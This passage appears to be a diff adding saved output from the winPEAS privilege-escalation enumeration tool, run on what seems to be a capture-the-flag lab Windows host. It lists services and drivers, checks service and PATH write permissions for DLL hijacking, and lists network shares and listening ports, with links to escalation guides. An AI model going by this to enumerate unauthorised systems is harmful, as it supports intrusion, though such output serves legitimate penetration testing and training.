+    @%systemroot%\system32\AgentService.exe,-102(@%systemroot%\system32\AgentService.exe,-102)[[0m[1;32mC:\Windows\system32\AgentService.exe[0m] - Manual
+    [1;37m@%systemroot%\system32\AgentService.exe,-101
+[1;90m   =================================================================================================[0m
+
+    USB Function Class Extension(USB Function Class Extension)[[0m[1;32msystem32\drivers\ufx01000.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ufxchipidea.inf,%UfxChipidea.ServiceName%;USB Chipidea Controller(@ufxchipidea.inf,%UfxChipidea.ServiceName%;USB Chipidea Controller)[[0m[1;32mC:\Windows\System32\drivers\UfxChipidea.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @ufxsynopsys.inf,%ufxsynopsys.ServiceName%;USB Synopsys Controller(@ufxsynopsys.inf,%ufxsynopsys.ServiceName%;USB Synopsys Controller)[[0m[1;32mC:\Windows\System32\drivers\ufxsynopsys.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @umbus.inf,%umbus.SVCDESC%;UMBus Enumerator Driver(@umbus.inf,%umbus.SVCDESC%;UMBus Enumerator Driver)[[0m[1;32mC:\Windows\System32\drivers\umbus.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @umpass.inf,%UmPass.SVCDESC%;Microsoft UMPass Driver(@umpass.inf,%UmPass.SVCDESC%;Microsoft UMPass Driver)[[0m[1;32mC:\Windows\System32\drivers\umpass.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @urschipidea.inf,%UrsChipidea.ServiceName%;Chipidea USB Role-Switch Driver(@urschipidea.inf,%UrsChipidea.ServiceName%;Chipidea USB Role-Switch Driver)[[0m[1;32mC:\Windows\System32\drivers\urschipidea.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    USB Role-Switch Support Library(USB Role-Switch Support Library)[[0m[1;32msystem32\drivers\urscx01000.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @urssynopsys.inf,%UrsSynopsys.ServiceName%;Synopsys USB Role-Switch Driver(@urssynopsys.inf,%UrsSynopsys.ServiceName%;Synopsys USB Role-Switch Driver)[[0m[1;32mC:\Windows\System32\drivers\urssynopsys.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usb.inf,%GenericParent.SvcDesc%;Microsoft USB Generic Parent Driver(@usb.inf,%GenericParent.SvcDesc%;Microsoft USB Generic Parent Driver)[[0m[1;32mC:\Windows\System32\drivers\usbccgp.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbcir.inf,%usbcir.SVCDESC%;eHome Infrared Receiver (USBCIR)(@usbcir.inf,%usbcir.SVCDESC%;eHome Infrared Receiver (USBCIR))[[0m[1;32mC:\Windows\System32\drivers\usbcir.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbport.inf,%EHCIMP.SvcDesc%;Microsoft USB 2.0 Enhanced Host Controller Miniport Driver(@usbport.inf,%EHCIMP.SvcDesc%;Microsoft USB 2.0 Enhanced Host Controller Miniport Driver)[[0m[1;32mC:\Windows\System32\drivers\usbehci.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbport.inf,%ROOTHUB.SvcDesc%;Microsoft USB Standard Hub Driver(@usbport.inf,%ROOTHUB.SvcDesc%;Microsoft USB Standard Hub Driver)[[0m[1;32mC:\Windows\System32\drivers\usbhub.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbhub3.inf,%UsbHub3.SVCDESC%;SuperSpeed Hub(@usbhub3.inf,%UsbHub3.SVCDESC%;SuperSpeed Hub)[[0m[1;32mC:\Windows\System32\drivers\UsbHub3.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbport.inf,%OHCIMP.SvcDesc%;Microsoft USB Open Host Controller Miniport Driver(@usbport.inf,%OHCIMP.SvcDesc%;Microsoft USB Open Host Controller Miniport Driver)[[0m[1;32mC:\Windows\System32\drivers\usbohci.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbprint.inf,%USBPRINT.SvcDesc%;Microsoft USB PRINTER Class(@usbprint.inf,%USBPRINT.SvcDesc%;Microsoft USB PRINTER Class)[[0m[1;32mC:\Windows\System32\drivers\usbprint.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbser.inf,%UsbSerial.DriverDesc%;Microsoft USB Serial Driver(@usbser.inf,%UsbSerial.DriverDesc%;Microsoft USB Serial Driver)[[0m[1;32mC:\Windows\System32\drivers\usbser.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[[0m[1;32mC:\Windows\System32\drivers\USBSTOR.SYS[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbport.inf,%UHCIMP.SvcDesc%;Microsoft USB Universal Host Controller Miniport Driver(@usbport.inf,%UHCIMP.SvcDesc%;Microsoft USB Universal Host Controller Miniport Driver)[[0m[1;32mC:\Windows\System32\drivers\usbuhci.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[[0m[1;32mC:\Windows\System32\drivers\USBXHCI.SYS[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\vaultsvc.dll,-1003(@%SystemRoot%\system32\vaultsvc.dll,-1003)[[0m[1;32mC:\Windows\system32\lsass.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\vaultsvc.dll,-1004
+[1;90m   =================================================================================================[0m
+
+    @vdrvroot.inf,%vdrvroot_svcdesc%;Microsoft Virtual Drive Enumerator(@vdrvroot.inf,%vdrvroot_svcdesc%;Microsoft Virtual Drive Enumerator)[[0m[1;32mSystem32\drivers\vdrvroot.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\vds.exe,-100(@%SystemRoot%\system32\vds.exe,-100)[[0m[1;32mC:\Windows\System32\vds.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\vds.exe,-112
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\VerifierExt.sys[0m[0m[0m,-1000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\VerifierExt.sys[0m[0m[0m,-1000)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\VerifierExt.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32mSystem32\drivers\VerifierExt.sys[0m,-1001
+[1;90m   =================================================================================================[0m
+
+    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)[[0m[1;32m"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"[0m] - Autoload
+    [1;37mAlias Manager and Ticket Service
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\vhf.sys,-100(@%SystemRoot%\system32\drivers\vhf.sys,-100)[[0m[1;32mC:\Windows\System32\drivers\vhf.sys[0m] - System
+    [1;37m@%SystemRoot%\system32\drivers\vhf.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @wvmbus.inf,%vmbus.SVCDESC%;Virtual Machine Bus(@wvmbus.inf,%vmbus.SVCDESC%;Virtual Machine Bus)[[0m[1;32mSystem32\drivers\vmbus.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(@oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[[0m[1;32mSystem32\drivers\vmci.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @wvmgid.inf,%VmGid.SVCDESC%;Microsoft Hyper-V Guest Infrastructure Driver(@wvmgid.inf,%VmGid.SVCDESC%;Microsoft Hyper-V Guest Infrastructure Driver)[[0m[1;32mC:\Windows\System32\drivers\vmgid.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Memory Control Driver(Memory Control Driver)[[0m[1;32mC:\Windows\system32\DRIVERS\vmmemctl.sys[0m] - Autoload
+    [1;37mDriver to provide enhanced memory management of this virtual machine.
+[1;90m   =================================================================================================[0m
+
+    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(@oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[[0m[1;32mC:\Windows\System32\drivers\vmmouse.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    VMware Tools(VMware, Inc. - VMware Tools)[[0m[1;32m"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"[0m] - Autoload
+    [1;37mProvides support for synchronizing objects between the host and guest operating systems.
+[1;90m   =================================================================================================[0m
+
+    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(@oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[[0m[1;32mC:\Windows\System32\drivers\vmusbmouse.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    VMware CAF AMQP Communication Service(VMware CAF AMQP Communication Service)[[0m[1;32m"C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"[0m] - System
+    [1;37mVMware Common Agent AMQP Communication Service
+[1;90m   =================================================================================================[0m
+
+    VMware CAF Management Agent Service(VMware CAF Management Agent Service)[[0m[1;32m"C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"[0m] - System
+    [1;37mVMware Common Agent Management Agent Service
+[1;90m   =================================================================================================[0m
+
+    @oem4.inf,%vmxnet3.ndis6.Service.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(@oem4.inf,%vmxnet3.ndis6.Service.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[[0m[1;32mC:\Windows\System32\drivers\vmxnet3.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @volmgr.inf,%volmgr_svcdesc%;Volume Manager Driver(@volmgr.inf,%volmgr_svcdesc%;Volume Manager Driver)[[0m[1;32mSystem32\drivers\volmgr.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\volmgrx.sys,-100(@%SystemRoot%\system32\drivers\volmgrx.sys,-100)[[0m[1;32mSystem32\drivers\volmgrx.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\volmgrx.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\volsnap.sys,-100(@%SystemRoot%\system32\drivers\volsnap.sys,-100)[[0m[1;32mSystem32\drivers\volsnap.sys[0m] - Boot
+    [1;37m@%SystemRoot%\system32\drivers\volsnap.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @volume.inf,%VolumeServiceDesc%;Volume driver(@volume.inf,%VolumeServiceDesc%;Volume driver)[[0m[1;32mSystem32\drivers\volume.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @wvpci.inf,%vpci.SVCDESC%;Microsoft Hyper-V Virtual PCI Bus(@wvpci.inf,%vpci.SVCDESC%;Microsoft Hyper-V Virtual PCI Bus)[[0m[1;32mC:\Windows\System32\drivers\vpci.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    vSockets Virtual Machine Communication Interface Sockets driver(vSockets Virtual Machine Communication Interface Sockets driver)[[0m[1;32msystem32\DRIVERS\vsock.sys[0m] - Boot
+    [1;37mvSockets Driver
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\vssvc.exe,-102(@%systemroot%\system32\vssvc.exe,-102)[[0m[1;32mC:\Windows\system32\vssvc.exe[0m] - System
+    [1;37m@%systemroot%\system32\vssvc.exe,-101
+[1;90m   =================================================================================================[0m
+
+    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(@vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[[0m[1;32mSystem32\drivers\vstxraid.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[[0m[1;32mC:\Windows\System32\drivers\vwifibus.sys[0m] - System
+    [1;37m@%SystemRoot%\System32\drivers\vwifibus.sys,-258
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\vwififlt.sys[0m[0m[0m,-259(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\vwififlt.sys[0m[0m[0m,-259)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\vwififlt.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32mSystem32\drivers\vwififlt.sys[0m,-260
+[1;90m   =================================================================================================[0m
+
+    @hiddigi.inf,%WacomPen.SVCDESC%;Wacom Serial Pen HID Driver(@hiddigi.inf,%WacomPen.SVCDESC%;Wacom Serial Pen HID Driver)[[0m[1;32mC:\Windows\System32\drivers\wacompen.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32011(@%systemroot%\system32\mprmsg.dll,-32011)[[0m[1;32mSystem32\DRIVERS\wanarp.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32011
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32012(@%systemroot%\system32\mprmsg.dll,-32012)[[0m[1;32mSystem32\DRIVERS\wanarp.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32012
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\wbengine.exe,-104(@%systemroot%\system32\wbengine.exe,-104)[[0m[1;32m"C:\Windows\system32\wbengine.exe"[0m] - System
+    [1;37m@%systemroot%\system32\wbengine.exe,-105
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\wcifs.sys,-100(@%systemroot%\system32\drivers\wcifs.sys,-100)[[0m[1;32mC:\Windows\system32\drivers\wcifs.sys[0m] - Autoload
+    [1;37m@%systemroot%\system32\drivers\wcifs.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\wcnfs.sys,-100(@%systemroot%\system32\drivers\wcnfs.sys,-100)[[0m[1;32mC:\Windows\system32\drivers\wcnfs.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\wcnfs.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%ProgramFiles%\Windows Defender\MpAsDesc.dll,-390(@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-390)[[0m[1;32msystem32\drivers\wd\WdBoot.sys[0m] - Boot
+    [1;37m@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-400
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Wdf01000.sys[0m[0m[0m,-1000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Wdf01000.sys[0m[0m[0m,-1000)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\Wdf01000.sys[0m[0m[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%ProgramFiles%\Windows Defender\MpAsDesc.dll,-330(@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-330)[[0m[1;32msystem32\drivers\wd\WdFilter.sys[0m] - Boot
+    [1;37m@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-340
+[1;90m   =================================================================================================[0m
+
+    WDI Driver Framework(WDI Driver Framework)[[0m[1;32msystem32\DRIVERS\wdiwifi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WdmCompanionFilter.sys[0m[0m[0m,-1000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WdmCompanionFilter.sys[0m[0m[0m,-1000)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WdmCompanionFilter.sys[0m[0m[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%ProgramFiles%\Windows Defender\MpAsDesc.dll,-370(@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-370)[[0m[1;32msystem32\drivers\wd\WdNisDrv.sys[0m] - System
+    [1;37m@%ProgramFiles%\Windows Defender\MpAsDesc.dll,-242
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\wfplwfs.sys[0m[0m[0m,-6000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\wfplwfs.sys[0m[0m[0m,-6000)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\wfplwfs.sys[0m[0m[0m] - Boot
+    [1;37m@%SystemRoot%\[0m[1;32mSystem32\drivers\wfplwfs.sys[0m,-6000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\wimmount.sys[0m[0m[0m,-101(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\wimmount.sys[0m[0m[0m,-101)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\wimmount.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\wimmount.sys[0m,-102
+[1;90m   =================================================================================================[0m
+
+    Windows Trusted Execution Environment Class Extension(Windows Trusted Execution Environment Class Extension)[[0m[1;32msystem32\drivers\WindowsTrustedRT.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @WindowsTrustedRTProxy.inf,%WindowsTrustedRTProxy.SVCDESC%;Microsoft Windows Trusted Runtime Secure Service(@WindowsTrustedRTProxy.inf,%WindowsTrustedRTProxy.SVCDESC%;Microsoft Windows Trusted Runtime Secure Service)[[0m[1;32mSystem32\drivers\WindowsTrustedRTProxy.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(@mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[[0m[1;32mC:\Windows\System32\drivers\winmad.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\winnat.sys[0m[0m[0m,-10001(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\winnat.sys[0m[0m[0m,-10001)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\winnat.sys[0m[0m[0m] - System
+    [1;37m@%SystemRoot%\[0m[1;32msystem32\drivers\winnat.sys[0m,-10002
+[1;90m   =================================================================================================[0m
+
+    @winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver(@winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver)[[0m[1;32mC:\Windows\System32\drivers\WinUSB.SYS[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(@mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[[0m[1;32mC:\Windows\System32\drivers\winverbs.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @wmiacpi.inf,%WMIMAP.SvcDesc%;Microsoft Windows Management Interface for ACPI(@wmiacpi.inf,%WMIMAP.SvcDesc%;Microsoft Windows Management Interface for ACPI)[[0m[1;32mC:\Windows\System32\drivers\wmiacpi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%Systemroot%\system32\wbem\wmiapsrv.exe,-110(@%Systemroot%\system32\wbem\wmiapsrv.exe,-110)[[0m[1;32mC:\Windows\system32\wbem\WmiApSrv.exe[0m] - System
+    [1;37m@%Systemroot%\system32\wbem\wmiapsrv.exe,-111
+[1;90m   =================================================================================================[0m
+
+    @%PROGRAMFILES%\Windows Media Player\wmpnetwk.exe,-101(@%PROGRAMFILES%\Windows Media Player\wmpnetwk.exe,-101)[[0m[1;32m"C:\Program Files (x86)\Windows Media Player\wmpnetwk.exe"[0m] - System
+    [1;37m@%PROGRAMFILES%\Windows Media Player\wmpnetwk.exe,-102
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\WpdUpFltr.sys[0m[0m[0m,-100(@%systemroot%\[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\WpdUpFltr.sys[0m[0m[0m,-100)[[0m[1;32m[0m[1;32m[0m[1;32mSystem32\drivers\WpdUpFltr.sys[0m[0m[0m] - System
+    [1;37m@%systemroot%\[0m[1;32mSystem32\drivers\WpdUpFltr.sys[0m,-100
+[1;90m   =================================================================================================[0m
+
+    Windows Socket 2.0 Non-IFS Service Provider Support Environment(Windows Socket 2.0 Non-IFS Service Provider Support Environment)[[0m[1;32mC:\Windows\system32\drivers\ws2ifsl.sys[0m] - System
+    [1;37m@%systemroot%\System32\drivers\ws2ifsl.sys,-1000
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\drivers\Wudfpf.sys,-1000(@%SystemRoot%\system32\drivers\Wudfpf.sys,-1000)[[0m[1;32msystem32\drivers\WudfPf.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WudfRd.sys[0m[0m[0m,-1000(@%SystemRoot%\[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WudfRd.sys[0m[0m[0m,-1000)[[0m[1;32m[0m[1;32m[0m[1;32msystem32\drivers\WudfRd.sys[0m[0m[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\xbgmsvc.exe,-100(@%systemroot%\system32\xbgmsvc.exe,-100)[[0m[1;32mC:\Windows\system32\xbgmsvc.exe[0m] - System
+    [1;37m@%systemroot%\system32\xbgmsvc.exe,-101
+[1;90m   =================================================================================================[0m
+
+    @xboxgip.inf,%XBOXGIP_Desc%;Xbox Game Input Protocol Driver(@xboxgip.inf,%XBOXGIP_Desc%;Xbox Game Input Protocol Driver)[[0m[1;32mC:\Windows\System32\drivers\xboxgip.sys[0m] - System
+    [1;37m@xboxgip.inf,%XBOXGIP_Desc%;Xbox Game Input Protocol Driver
+[1;90m   =================================================================================================[0m
+
+    @xinputhid.inf,%xinputhid.SvcDesc%;XINPUT HID Filter Driver(@xinputhid.inf,%xinputhid.SvcDesc%;XINPUT HID Filter Driver)[[0m[1;32mC:\Windows\System32\drivers\xinputhid.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+
+[33m  [+] [1;32mModifiable Services[33m([1;90mT1007[33m)[0m
+[33m   [?] [1;34mCheck if you can modify any service [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services[0m
+[1;32m    You cannot modify any service[0m
+
+[33m  [+] [1;32mLooking if you can modify any service registry[33m([1;90m[33m)[0m
+[33m   [?] [1;34mCheck if you can modify the registry of a service [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions[0m
+[1;32m    [-] Looks like you cannot change the registry of any service...[0m
+
+[33m  [+] [1;32mChecking write permissions in PATH folders (DLL Hijacking)[33m([1;90m[33m)[0m
+[33m   [?] [1;34mCheck for DLL Hijacking in PATH folders [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking[0m
+[1;32m    C:\Windows\system32[0m
+[1;32m    C:\Windows[0m
+[1;32m    C:\Windows\System32\Wbem[0m
+[1;32m    C:\Windows\System32\WindowsPowerShell\v1.0\[0m
+[1;32m    C:\Windows\System32\OpenSSH\[0m
+
+
+[1;36m  ====================================([0m[33mApplications Information[1;36m)====================================[0m
+
+[33m  [+] [1;32mCurrent Active Window Application[33m([1;90mT1010&T1518[33m)[0m
+[1;90mSystem.NullReferenceException: Object reference not set to an instance of an object.
+   at winPEAS.MyUtils.GetPermissionsFile(String path, Dictionary`2 SIDs)
+   at winPEAS.Program.<PrintInfoApplications>g__PrintActiveWindow|44_0()[0m
+
+[33m  [+] [1;32mInstalled Applications --Via Program Files/Uninstall registry--[33m([1;90mT1083&T1012&T1010&T1518[33m)[0m
+[33m   [?] [1;34mCheck if you can modify installed software [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software[0m
+[1;32m    C:\Program Files\Common Files[0m
+[1;32m    C:\Program Files\CUAssistant[0m
+[1;32m    C:\Program Files\desktop.ini[0m
+[1;32m    C:\Program Files\internet explorer[0m
+[1;32m    C:\Program Files\rempl[0m
+[1;32m    C:\Program Files\Uninstall Information[0m
+[1;32m    C:\Program Files\UNP[0m
+[1;32m    C:\Program Files\VMware[0m
+[1;32m    C:\Program Files\Windows Defender[0m
+[1;32m    C:\Program Files\Windows Defender Advanced Threat Protection[0m
+[1;32m    C:\Program Files\Windows Mail[0m
+[1;32m    C:\Program Files\Windows Media Player[0m
+[1;32m    C:\Program Files\Windows Multimedia Platform[0m
+[1;32m    C:\Program Files\windows nt[0m
+[1;32m    C:\Program Files\Windows Photo Viewer[0m
+[1;32m    C:\Program Files\Windows Portable Devices[0m
+[1;32m    C:\Program Files\Windows Security[0m
+[1;32m    C:\Program Files\Windows Sidebar[0m
+[1;32m    C:\Program Files\WindowsApps[0m
+[1;32m    C:\Program Files\WindowsPowerShell[0m
+
+
+[33m  [+] [1;32mAutorun Applications[33m([1;90mT1010[33m)[0m
+[33m   [?] [1;34mCheck if you can modify other users AutoRuns binaries [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup[0m
+[1;90mSystem.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
+   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
+   at winPEAS.Program.<PrintInfoApplications>g__PrintAutoRuns|44_2()[0m
+
+[33m  [+] [1;32mScheduled Applications --Non Microsoft--[33m([1;90mT1010[33m)[0m
+[33m   [?] [1;34mCheck if you can modify other users scheduled binaries [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup[0m
+[1;90mSystem.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.
+File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'
+   at winPEAS.ApplicationInfo.GetScheduledAppsNoMicrosoft()
+   at winPEAS.Program.<PrintInfoApplications>g__PrintScheduled|44_3()
+
+WRN: Assembly binding logging is turned OFF.
+To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
+Note: There is some performance penalty associated with assembly bind failure logging.
+To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].
+[0m
+
+
+[1;36m  =========================================([0m[33mNetwork Information[1;36m)=========================================[0m
+
+[33m  [+] [1;32mNetwork Shares[33m([1;90mT1135[33m)[0m
+    [0m[1;32mADMIN$[0m ([1;37mPath: C:\Windows[0m)
+    [0m[1;32mC$[0m ([1;37mPath: C:\[0m)
+    [0m[1;32mIPC$[0m ([1;37mPath: [0m)
+
+[33m  [+] [1;32mHost File[33m([1;90mT1016[33m)[0m
+
+[33m  [+] [1;32mNetwork Ifaces and known hosts[33m([1;90mT1016[33m)[0m
+[33m   [?] [1;34mThe masks are only for the IPv4 addresses [1;33m[0m
+    Ethernet0[00:50:56:B9:97:C2]: 10.10.10.198, fe80::989:26f2:f820:9629%10, dead:beef::6065:d01c:6a48:130f, dead:beef::989:26f2:f820:9629 / 255.255.255.0
+        [1;37mGateways: [0m10.10.10.2, fe80::250:56ff:feb9:9eb2%10
+        [1;37mDNSs: [0m8.8.8.8
+        [1;37mKnown hosts:[0m
+          10.10.10.2            00-50-56-B9-9E-B2     Dynamic
+          10.10.10.255          FF-FF-FF-FF-FF-FF     Static
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.252           01-00-5E-00-00-FC     Static
+          239.255.255.250       01-00-5E-7F-FF-FA     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        [1;37mDNSs: [0mfec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        [1;37mKnown hosts:[0m
+          224.0.0.22            00-00-00-00-00-00     Static
+          239.255.255.250       00-00-00-00-00-00     Static
+
+
+[33m  [+] [1;32mCurrent Listening Ports[33m([1;90mT1049&T1049[33m)[0m
+[33m   [?] [1;34mCheck for services restricted from the outside [1;33m[0m
+    Proto     Local Address          Foreing Address        State
+    TCP       0.0.0.0:135                                   Listening
+    TCP       0.0.0.0:445                                   Listening
+    TCP       0.0.0.0:5040                                  Listening
+    TCP       0.0.0.0:7680                                  Listening
+    TCP       0.0.0.0:8080                                  Listening
+    TCP       0.0.0.0:49664                                 Listening
+    TCP       0.0.0.0:49665                                 Listening
+    TCP       0.0.0.0:49666                                 Listening
+    TCP       0.0.0.0:49667                                 Listening
+    TCP       0.0.0.0:49668                                 Listening
+    TCP       0.0.0.0:49669                                 Listening
+    TCP       10.10.10.198:139                              Listening
+    TCP       [0m[1;31m127.0.0.1[0m:3306                                Listening
+    TCP       [0m[1;31m127.0.0.1[0m:8888                                Listening
+    TCP       [::]:135                                      Listening
+    TCP       [::]:445                                      Listening
+    TCP       [::]:7680                                     Listening
+    TCP       [::]:8080                                     Listening
+    TCP       [::]:49664                                    Listening
+    TCP       [::]:49665                                    Listening
